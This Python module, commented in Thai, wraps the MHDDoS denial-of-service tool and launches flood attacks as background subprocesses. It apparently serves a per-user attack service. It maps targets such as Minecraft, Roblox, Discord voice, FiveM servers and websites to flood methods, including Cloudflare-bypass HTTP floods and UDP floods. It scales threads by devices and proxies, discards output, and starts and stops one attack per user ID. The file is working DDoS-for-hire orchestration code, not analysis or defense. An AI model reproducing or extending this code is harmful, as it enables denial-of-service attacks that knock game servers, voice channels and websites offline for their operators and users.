# mhddos_engine.py
"""
MHDDoS engine — เรียก start.py เป็น subprocess
L7: python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
L4: python3 start.py <method> <ip:port> <threads> <duration>
"""
import asyncio
import os
import sys
from config import MHDDOS_FULL, PROXIES_PER_DEVICE, PROXY_ATTACK_FILE


# ── C4: method names ตาม MHDDoS MatrixTM standard ──
# ถ้า start.py ของ dj ไม่มี method ไหน → attack exit code 1 ทันที
# verify: `python3 start.py --help` หรือเปิด start.py ดู class Layer4 / Layer7
MODULE_MAP = {
    "minecraft":  ("L4", "MCBOT",     {}),      # MCBOT = Minecraft bot flood
    "roblox":     ("L4", "UDP",       {}),      # Roblox ใช้ UDP
    "discord":    ("L4", "UDP",       {}),      # voice channel = UDP
    "fivem":      ("L4", "FIVEM",     {}),      # FIVEM (มีใน MHDDoS v2.4+)
    "web":        ("L7", "CFB",       {"rpc": 64}),
    "web_bypass": ("L7", "BYPASS",    {"rpc": 64}),
    "web_stress": ("L7", "STRESS",    {"rpc": 64}),
    "http_flood": ("L7", "GET",       {"rpc": 128}),
}


class MHDDoSEngine:
    def __init__(self, proxies_path: str = PROXY_ATTACK_FILE):
        self.proxies_path = proxies_path
        self.running: dict[int, asyncio.subprocess.Process] = {}

    def _build_cmd(self, module: str, target: str, port: int,
                   duration: int, devices: int):
        info = MODULE_MAP.get(module)
        if not info:
            raise ValueError(f"unknown module: {module}")

        layer, method, extra = info
        threads = max(100, devices * 50 * PROXIES_PER_DEVICE)
        rpc = extra.get("rpc", 64)

        if layer == "L7":
            host = target if target.startswith("http") else f"http://{target}"
            if port and ":" not in host.split("//")[-1]:
                host = f"{host}:{port}"
            return [
                sys.executable, MHDDOS_FULL,          # H1: absolute path
                method, host, "5", str(threads),
                self.proxies_path, str(rpc), str(duration),
            ]
        else:
            host = target.split("//")[-1].split("/")[0]
            if ":" not in host:
                host = f"{host}:{port}"
            return [
                sys.executable, MHDDOS_FULL,
                method, host, str(threads), str(duration),
            ]

    async def start(self, user_id: int, module: str, target: str, port: int,
                    duration: int, devices: int):
        if user_id in self.running:
            raise RuntimeError("มี attack รันอยู่แล้ว")

        cmd = self._build_cmd(module, target, port, duration, devices)

        # C2: ทิ้ง output — ป้องกัน pipe buffer block
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
            cwd=os.path.dirname(MHDDOS_FULL),   # ให้ MHDDoS หา relative files ได้
        )
        self.running[user_id] = proc
        return proc

    async def stop(self, user_id: int):
        proc = self.running.pop(user_id, None)
        if proc and proc.returncode is None:
            proc.terminate()
            try:
                await asyncio.wait_for(proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                proc.kill()

    def is_running(self, user_id: int) -> bool:
        return user_id in self.running

    def is_alive(self, user_id: int) -> bool:
        proc = self.running.get(user_id)
        return proc is not None and proc.returncode is None